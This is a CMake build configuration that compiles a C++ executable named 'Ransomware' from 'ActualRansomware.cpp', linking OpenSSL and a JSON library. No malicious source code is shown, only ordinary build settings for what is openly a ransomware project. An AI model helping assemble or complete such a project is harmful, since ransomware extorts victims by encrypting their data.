cmake_minimum_required(VERSION 3.20)
project(Ransomware)

set(CMAKE_CXX_STANDARD 14)

set(JSON_BuildTests OFF CACHE INTERNAL "")

add_subdirectory(lib/json)

add_executable(Ransomware ActualRansomware.cpp)

find_package(OpenSSL REQUIRED)
target_link_libraries(Ransomware OpenSSL::SSL nlohmann_json)
